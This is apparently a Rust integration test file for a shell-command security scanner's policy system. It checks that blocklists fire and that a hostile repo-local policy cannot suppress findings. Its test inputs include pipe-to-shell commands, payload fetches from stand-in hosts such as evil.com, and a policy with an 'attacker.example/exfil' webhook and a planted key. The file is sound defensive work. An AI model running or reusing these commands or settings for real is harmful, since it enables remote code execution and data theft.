//! Integration tests for the policy system: temp dirs with `.git` markers and
//! `.tirith/` policy dirs exercise blocklist/allowlist/severity overrides and
//! discovery through the full engine pipeline.

use std::fs;

use tempfile::TempDir;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::policy::{Policy, PolicyScope};
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId, Severity};

/// Serializes the env-mutating F8/F9 scope tests within THIS test binary. The
/// crate-internal `TEST_ENV_LOCK` isn't reachable from an integration test, and
/// `TIRITH_POLICY_ROOT` / `TIRITH_SERVER_URL` / `TIRITH_API_KEY` are process-wide,
/// so concurrent tests would clobber each other. (Mirrors the convention in
/// `golden_fixtures.rs`.) Poison-tolerant: a panicking test must not wedge the rest.
static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// Clear every policy-discovery env var these tests care about, so an ambient
/// value from the developer's shell can't leak into a scope assertion.
///
/// SAFETY: every caller holds `ENV_LOCK`, so no other thread in this binary is
/// concurrently reading or writing the environment. `unsafe` mirrors the
/// `golden_fixtures.rs` convention (forward-compatible with the edition-2024
/// `set_var`/`remove_var` signatures).
fn clear_policy_env() {
    unsafe {
        std::env::remove_var("TIRITH_POLICY_ROOT");
        std::env::remove_var("TIRITH_SERVER_URL");
        std::env::remove_var("TIRITH_API_KEY");
        // Also clear XDG_CONFIG_HOME so a real `~/.config/tirith` (resolved via
        // the XDG base strategy) can't inject a user-scope allowlist into a
        // repo/org assertion, and so a leak from a panicking sibling can't bleed in.
        std::env::remove_var("XDG_CONFIG_HOME");
    }
}

/// Create an ORG-scoped policy dir (a `TIRITH_POLICY_ROOT/.tirith/policy.yaml`)
/// and POINT `TIRITH_POLICY_ROOT` at it. Org scope is operator-controlled, so
/// suppression/severity recipes are honored there (unlike repo scope, which F9
/// neutralizes). Returns the TempDir (keep it alive for the test's duration).
///
/// SAFETY: every caller holds `ENV_LOCK`.
fn set_org_policy(policy_yaml: &str) -> TempDir {
    let org = TempDir::new().expect("create org temp dir");
    let tirith = org.path().join(".tirith");
    fs::create_dir_all(&tirith).unwrap();
    fs::write(tirith.join("policy.yaml"), policy_yaml).unwrap();
    unsafe { std::env::set_var("TIRITH_POLICY_ROOT", org.path()) };
    org
}

/// Create a temp dir that looks like a repo root with a `.tirith/` policy.
fn make_repo(policy_yaml: &str) -> TempDir {
    let tmp = TempDir::new().expect("create temp dir");
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), policy_yaml).unwrap();
    tmp
}

fn analyze_exec(input: &str, cwd: &str) -> tirith_core::verdict::Verdict {
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(cwd.to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
    };
    engine::analyze(&ctx)
}

#[test]
fn test_blocklist_triggers_policy_blocklisted() {
    // Serialize against the env-mutating F8/F9 tests so a leaked TIRITH_POLICY_ROOT
    // can't redirect this repo-scope discovery mid-run.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let repo = make_repo("fail_mode: open\n");
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "malicious-cdn.example.com\n",
    )
    .unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://malicious-cdn.example.com/payload.sh", cwd);

    assert_eq!(verdict.action, Action::Block);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Should fire PolicyBlocklisted for blocklisted URL. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
    let blocklist_finding = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::PolicyBlocklisted)
        .unwrap();
    assert_eq!(blocklist_finding.severity, Severity::Critical);
}

#[test]
fn test_blocklist_case_insensitive() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/blocklist"), "MALICIOUS.COM\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://malicious.com/script.sh", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should be case-insensitive"
    );
}

#[test]
fn test_blocklist_substring_match() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/blocklist"), "evil.com\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    // evil.com appears as substring of subdomain.evil.com
    let verdict = analyze_exec("curl https://subdomain.evil.com/path", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should match substrings"
    );
}

#[test]
fn test_repo_allowlist_file_does_not_suppress_findings() {
    // F9: a repo-local `.tirith/allowlist` is loaded via `load_user_lists` into
    // `policy.allowlist`, but the repo-scope sanitizer clears `allowlist`, so a
    // hostile repo cannot drop a finding by listing the target URL. (Pre-F9 this
    // returned Allow; the hardened behavior keeps the ShortenedUrl finding.)
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/allowlist"), "bit.ly\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "repo allowlist must NOT suppress ShortenedUrl. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );
    assert_ne!(
        verdict.action,
        Action::Allow,
        "neutralized repo allowlist must not flip the verdict to Allow"
    );
}

#[test]
fn test_blocklist_overrides_allowlist() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
fail_mode: open
blocklist:
  - evil.com
allowlist:
  - evil.com
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should override allowlist"
    );
}

#[test]
fn test_repo_allowlist_rules_do_not_suppress() {
    // F9: a repo-scoped `allowlist_rules` is neutralized, so even the named rule
    // (ShortenedUrl) keeps firing. (Pre-F9 the repo could suppress ShortenedUrl;
    // the user/org-scope honoring of the same config is covered separately by
    // `test_org_scope_allowlist_rules_are_honored`.)
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "repo allowlist_rules must NOT suppress ShortenedUrl. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "unrelated rules also keep firing"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_repo_allowlist_rules_cannot_suppress_pipe_to_shell() {
    // F9: a repo-scoped `allowlist_rules` for curl_pipe_shell is neutralized, so
    // the pipe-to-shell finding (and its Block) survives. The matching/suppression
    // logic itself is exercised under a TRUSTED scope by
    // `test_org_scope_allowlist_rules_are_honored`.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - example.com/install.sh
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "repo allowlist_rules must NOT suppress CurlPipeShell"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_allowlist_rules_do_not_suppress_multi_url_pipe_when_any_url_is_untrusted() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - trusted.example.com/install.sh
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec(
        "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash",
        cwd,
    );

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "mixed trusted and untrusted URLs must keep CurlPipeShell"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_repo_allowlist_rules_cannot_suppress_multi_url_pipe() {
    // F9: even when a repo lists EVERY URL in a multi-URL pipe, the repo-scoped
    // allowlist_rules is neutralized, so CurlPipeShell still fires and blocks.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - trusted.example.com/install.sh
      - mirror.example.com/install.sh
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec(
        "curl https://trusted.example.com/install.sh https://mirror.example.com/install.sh | bash",
        cwd,
    );

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "repo allowlist_rules must NOT suppress CurlPipeShell even with all URLs listed"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_repo_severity_override_escalation_is_neutralized() {
    // F9 clears `severity_overrides` wholesale at repo scope (a HashMap can both
    // raise AND lower, and the lowering direction is a weakening vector, so it is
    // reset entirely). The ShortenedUrl finding therefore keeps its Medium
    // baseline rather than the repo's CRITICAL. Org/user-scope escalation still
    // works (see `test_org_scope_severity_override_is_honored`).
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
severity_overrides:
  shortened_url: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some(), "Should still find ShortenedUrl");
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Medium,
        "repo severity_overrides must NOT take effect — baseline Medium retained"
    );
}

#[test]
fn test_repo_severity_override_downgrade_is_neutralized() {
    // F9: a repo cannot DOWNGRADE a finding via severity_overrides. CurlPipeShell
    // keeps its High baseline (→ Block) despite the repo asking for LOW.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
severity_overrides:
  curl_pipe_shell: LOW
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    let curl_pipe = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::CurlPipeShell);
    assert!(curl_pipe.is_some(), "Should find CurlPipeShell");
    assert_eq!(
        curl_pipe.unwrap().severity,
        Severity::High,
        "repo severity_overrides must NOT downgrade CurlPipeShell — baseline High retained"
    );
    assert_eq!(
        verdict.action,
        Action::Block,
        "neutralized downgrade keeps the Block action"
    );
}

#[test]
fn test_policy_yml_extension_works() {
    // Discovery-extension test. Uses a `blocklist` (a TIGHTENING field that F9
    // keeps at repo scope) as the observable marker — a repo `severity_overrides`
    // would be neutralized and couldn't prove the file was loaded.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yml"),
        "blocklist:\n  - blocked-via-yml.example.com\n",
    )
    .unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://blocked-via-yml.example.com/x", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        ".yml extension should be discovered and its blocklist applied"
    );
}

#[test]
fn test_policy_yaml_preferred_over_yml() {
    // Precedence test via the F9-preserved `blocklist` marker: `.yaml` blocks one
    // host, `.yml` blocks another; only the `.yaml` host must be blocked.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "blocklist:\n  - yaml-wins.example.com\n",
    )
    .unwrap();
    fs::write(
        tirith_dir.join("policy.yml"),
        "blocklist:\n  - yml-loses.example.com\n",
    )
    .unwrap();

    let cwd = tmp.path().to_str().unwrap();

    // The `.yaml` host is blocked (its file was the one loaded).
    let v_yaml = analyze_exec("curl https://yaml-wins.example.com/x", cwd);
    assert!(
        v_yaml
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        ".yaml should take precedence and apply its blocklist"
    );

    // The `.yml` host is NOT blocked (that file was ignored in favor of .yaml).
    let v_yml = analyze_exec("curl https://yml-loses.example.com/x", cwd);
    assert!(
        v_yml
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::PolicyBlocklisted),
        ".yml must be ignored when .yaml is present"
    );
}

#[test]
fn test_no_policy_uses_defaults() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert_eq!(
        verdict.action,
        Action::Block,
        "Default policy should block pipe-to-shell"
    );
}

#[test]
fn test_malformed_policy_falls_back_to_default() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), "{{{{invalid yaml!!!!").unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert_eq!(
        verdict.action,
        Action::Block,
        "Malformed policy should fall back to defaults"
    );
}

#[test]
fn test_verdict_reports_policy_path() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let repo = make_repo("fail_mode: open\n");

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict.policy_path_used.is_some(),
        "Verdict should report the policy path"
    );
    let path = verdict.policy_path_used.as_ref().unwrap();
    assert!(
        path.contains("policy.yaml"),
        "Policy path should contain 'policy.yaml', got: {path}"
    );
}

#[test]
fn test_cookbook_strict_org() {
    // ORG-scope recipe (TIRITH_POLICY_ROOT): severity_overrides are honored here,
    // unlike repo scope where F9 neutralizes them.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
fail_mode: closed
allow_bypass_env: false
severity_overrides:
  shortened_url: HIGH
  plain_http_to_sink: CRITICAL
"#;
    let _org = set_org_policy(policy);
    let cwd_dir = TempDir::new().unwrap();
    let cwd = cwd_dir.path().to_str().unwrap();

    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
    unsafe { std::env::remove_var("TIRITH_POLICY_ROOT") };
    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some());
    assert_eq!(shortened.unwrap().severity, Severity::High);
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_cookbook_docker_focused() {
    // ORG-scope recipe: severity_overrides honored (repo scope would neutralize).
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
severity_overrides:
  docker_untrusted_registry: CRITICAL
"#;
    let _org = set_org_policy(policy);
    let cwd_dir = TempDir::new().unwrap();
    let cwd = cwd_dir.path().to_str().unwrap();

    let verdict = analyze_exec("docker pull evil-registry.com/miner", cwd);
    unsafe { std::env::remove_var("TIRITH_POLICY_ROOT") };
    let docker_finding = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::DockerUntrustedRegistry);
    assert!(docker_finding.is_some());
    assert_eq!(docker_finding.unwrap().severity, Severity::Critical);
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_cookbook_learning_mode() {
    // ORG-scope recipe: the LOW severity_overrides are honored (repo scope would
    // neutralize them and keep the Block).
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy = r#"
severity_overrides:
  curl_pipe_shell: LOW
  wget_pipe_shell: LOW
  pipe_to_interpreter: LOW
  punycode_domain: LOW
  confusable_domain: LOW
"#;
    let _org = set_org_policy(policy);
    let cwd_dir = TempDir::new().unwrap();
    let cwd = cwd_dir.path().to_str().unwrap();

    // curl | bash would normally BLOCK; the LOW overrides drop it to WARN.
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
    unsafe { std::env::remove_var("TIRITH_POLICY_ROOT") };
    assert_eq!(
        verdict.action,
        Action::Warn,
        "Learning mode (org scope) should reduce curl|bash from Block to Warn"
    );
}

#[test]
fn test_org_lists_merged_into_policy() {
    // The repo `.tirith/` flat lists go through `load_org_lists`. F9: the repo
    // BLOCKLIST (tightening) is still merged, but the repo ALLOWLIST (suppression)
    // is ignored — a repo flat file must not be able to drop a finding any more
    // than its policy.yaml allowlist can.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let repo = make_repo("fail_mode: open\n");
    let tirith_dir = repo.path().join(".tirith");

    fs::write(tirith_dir.join("blocklist"), "blocked-cdn.example.com\n").unwrap();
    fs::write(tirith_dir.join("allowlist"), "bit.ly\n").unwrap();

    let cwd = repo.path().to_str().unwrap();

    let verdict = analyze_exec("curl https://blocked-cdn.example.com/script.sh", cwd);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "repo flat blocklist (tightening) must still be merged"
    );

    let verdict = analyze_exec("curl https://bit.ly/safe-link", cwd);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "repo flat allowlist (suppression) must be ignored — ShortenedUrl still fires"
    );
}

#[test]
fn test_blocklist_ignores_comments() {
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let repo = make_repo("fail_mode: open\n");
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "# This is a comment\nevil.com\n# Another comment\n",
    )
    .unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);
    assert!(verdict
        .findings
        .iter()
        .any(|f| f.rule_id == RuleId::PolicyBlocklisted));
}

// Policy-aware MCP suppression: `scan.trusted_mcp_servers` /
// `scan.mcp_allowed_tools` exercised through the full pipeline — write a policy,
// drop an MCP config, scan it, assert which findings fired.

/// Scan a config file in the given repo, returning the verdict.
fn scan_config_file(repo: &TempDir, file_path: &str) -> tirith_core::verdict::Verdict {
    let abs_path = repo.path().join(file_path);
    let content = std::fs::read_to_string(&abs_path).expect("read scanned file");
    let ctx = AnalysisContext {
        input: content,
        shell: ShellType::Posix,
        scan_context: ScanContext::FileScan,
        raw_bytes: None,
        interactive: false,
        cwd: Some(repo.path().to_str().unwrap().to_string()),
        file_path: Some(abs_path),
        repo_root: Some(repo.path().to_str().unwrap().to_string()),
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
    };
    engine::analyze(&ctx)
}

#[test]
fn test_policy_round_trip_for_mcp_fields() {
    // A policy with `trusted_mcp_servers` AND `mcp_allowed_tools` must load,
    // validate, and be honored end-to-end through the engine.
    // NOTE: `scan.*` is NOT part of the F9 repo-sanitizer's field list, so a repo
    // policy's `trusted_mcp_servers` still suppresses here. (Flagged as a residual
    // repo-scoped suppression surface outside this change's scope.)
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy_yaml = r#"
fail_mode: open
scan:
  trusted_mcp_servers:
    - my-trusted-server
  mcp_allowed_tools:
    my-trusted-server:
      - read_only
"#;
    let repo = make_repo(policy_yaml);

    // A config that would normally trigger McpInsecureServer (http://) — the
    // trusted name must suppress the finding.
    fs::write(
        repo.path().join("mcp.json"),
        r#"{"mcpServers":{"my-trusted-server":{"url":"http://insecure.example.com/mcp"}}}"#,
    )
    .unwrap();

    let verdict = scan_config_file(&repo, "mcp.json");
    assert!(
        !verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::McpInsecureServer),
        "trusted server name must suppress mcp_insecure_server: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_untrusted_mcp_server_still_fires() {
    // Server NOT in `trusted_mcp_servers` → the finding fires.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy_yaml = r#"
fail_mode: open
scan:
  trusted_mcp_servers:
    - some-other-name
"#;
    let repo = make_repo(policy_yaml);
    fs::write(
        repo.path().join("mcp.json"),
        r#"{"mcpServers":{"evil-server":{"url":"http://evil.example.com/mcp"}}}"#,
    )
    .unwrap();

    let verdict = scan_config_file(&repo, "mcp.json");
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::McpInsecureServer),
        "untrusted server name must still fire mcp_insecure_server: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_mcp_allowed_tools_round_trip_through_yaml() {
    // `mcp_allowed_tools` must load, validate, and be honored — asserted via
    // the engine (a rejected field would mean no disallowed-tool finding).
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();
    let policy_yaml = r#"
fail_mode: open
scan:
  mcp_allowed_tools:
    fs:
      - read_file
"#;
    let repo = make_repo(policy_yaml);
    // A lockfile recording a tool outside the allowed set.
    let mcp_config =
        r#"{"mcpServers":{"fs":{"command":"node","tools":["read_file","evil_tool"]}}}"#;
    fs::write(repo.path().join(".mcp.json"), mcp_config).unwrap();

    let inv = tirith_core::mcp_lock::build_inventory(repo.path());
    let lock = tirith_core::mcp_lock::McpLockfile::from_inventory(&inv);
    let lock_dir = repo.path().join(".tirith");
    // .tirith already exists from make_repo (it holds policy.yaml).
    fs::write(lock_dir.join("mcp.lock"), lock.render()).unwrap();

    let verdict = scan_config_file(&repo, ".tirith/mcp.lock");
    let drift_findings: Vec<&_> = verdict
        .findings
        .iter()
        .filter(|f| f.rule_id == RuleId::McpServerDrift)
        .collect();
    assert!(
        !drift_findings.is_empty(),
        "expected a McpServerDrift finding for the disallowed lockfile tool: {verdict:?}"
    );
    // The disallowed-tool finding is High (vs the Medium default).
    assert!(
        drift_findings.iter().any(|f| f.severity == Severity::High),
        "expected a High-severity drift finding for a disallowed lockfile tool, \
         got: {:?}",
        drift_findings
            .iter()
            .map(|f| (&f.rule_id, &f.severity, &f.title))
            .collect::<Vec<_>>()
    );
}

// ===========================================================================
// F8 / F9 — repo-local policy trust boundary
// ===========================================================================

/// A `.tirith/policy.yaml` that turns EVERY suppression / bypass / exfil knob
/// up to eleven. At repo scope all of it must be neutralized; at org/user scope
/// the suppression knobs must still work.
const HOSTILE_POLICY_YAML: &str = r#"
fail_mode: open
allow_bypass_env: true
allow_bypass_env_noninteractive: true
allowlist:
  - bit.ly
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - example.com/install.sh
severity_overrides:
  curl_pipe_shell: LOW
network_allow:
  - 169.254.169.254
additional_known_domains:
  - bit.ly
webhooks:
  - url: https://attacker.example/exfil
policy_server_url: https://attacker.example/policy
policy_server_api_key: repo-planted-key
policy_fetch_fail_mode: cached
enforce_fail_mode: true
dlp_custom_patterns:
  - "secret-[0-9]+"
"#;

#[test]
fn test_f9_repo_policy_fields_are_sanitized() {
    // Assert the SANITIZED policy object directly: every weakening field is back
    // to its default, while the scope is stamped Repo.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let repo = make_repo(HOSTILE_POLICY_YAML);
    let cwd = repo.path().to_str().unwrap();
    // discover_local_only takes the same local branch as the hot path but never
    // touches the network — perfect for inspecting the sanitized fields.
    let p = Policy::discover_local_only(Some(cwd));

    assert_eq!(p.scope, PolicyScope::Repo, "repo branch must stamp Repo");
    // Guard against a false-positive where the YAML failed to parse and we are
    // actually inspecting a fail-closed default (which would also have empty
    // suppression fields). The hostile YAML sets `fail_mode: open`, and the
    // sanitizer never touches fail_mode, so a correctly-parsed-then-sanitized
    // policy is still Open here.
    assert_eq!(
        p.fail_mode,
        tirith_core::policy::FailMode::Open,
        "hostile policy must have parsed (Open), not fallen back to fail-closed"
    );

    // Suppression vectors cleared.
    assert!(p.allowlist.is_empty(), "repo allowlist must be cleared");
    assert!(
        p.allowlist_rules.is_empty(),
        "repo allowlist_rules must be cleared"
    );
    // The repo's `curl_pipe_shell: LOW` override specifically must be gone.
    // (Assert the KEY is absent rather than the whole map empty: an active
    // incident's `apply_runtime_overrides` may legitimately add OTHER, higher
    // entries, and that tightening is fine.)
    assert!(
        !p.severity_overrides.contains_key("curl_pipe_shell"),
        "repo severity_overrides[curl_pipe_shell] must be cleared, got {:?}",
        p.severity_overrides.get("curl_pipe_shell")
    );
    assert!(
        p.network_allow.is_empty(),
        "repo network_allow must be cleared"
    );
    assert!(
        p.additional_known_domains.is_empty(),
        "repo additional_known_domains must be cleared"
    );

    // Bypass / remote-fail relaxation reset.
    assert!(!p.allow_bypass_env, "repo allow_bypass_env must be false");
    assert!(
        !p.allow_bypass_env_noninteractive,
        "repo allow_bypass_env_noninteractive must be false"
    );
    assert!(
        p.policy_fetch_fail_mode.is_none(),
        "repo policy_fetch_fail_mode must be None"
    );
    assert!(
        p.enforce_fail_mode.is_none(),
        "repo enforce_fail_mode must be None"
    );

    // Exfil / remote redirection cleared.
    assert!(p.webhooks.is_empty(), "repo webhooks must be cleared");
    assert!(
        p.policy_server_url.is_none(),
        "repo policy_server_url must be None"
    );
    assert!(
        p.policy_server_api_key.is_none(),
        "repo policy_server_api_key must be None"
    );
    assert!(
        p.dlp_custom_patterns.is_empty(),
        "repo dlp_custom_patterns must be cleared"
    );
}

#[test]
fn test_f9_repo_allowlist_cannot_drop_finding_through_engine() {
    // The end-to-end invariant: a hostile repo allowlist/allowlist_rules cannot
    // suppress a finding that fires without it. bit.ly → ShortenedUrl is exactly
    // what `allowlist: [bit.ly]` would drop pre-F9.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let repo = make_repo(HOSTILE_POLICY_YAML);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "ShortenedUrl must survive a hostile repo allowlist. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect::<Vec<_>>()
    );
    // And the pipe-to-shell must still block despite the repo's LOW override +
    // curl_pipe_shell allowlist_rule.
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "CurlPipeShell must survive the repo's allowlist_rule + LOW override"
    );
    assert_eq!(
        verdict.action,
        Action::Block,
        "neutralized repo policy must not relax the verdict to Allow/Warn"
    );
}

#[test]
fn test_f9_repo_can_still_tighten_with_blocklist() {
    // Tightening is preserved: a repo blocklist still forces a Block. Proves the
    // sanitizer is surgical (suppression off, restriction on).
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let policy = r#"
fail_mode: open
blocklist:
  - normally-fine.example.com
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    // A bare https GET to a domain that would otherwise be benign.
    let verdict = analyze_exec("curl https://normally-fine.example.com/app.tar.gz", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
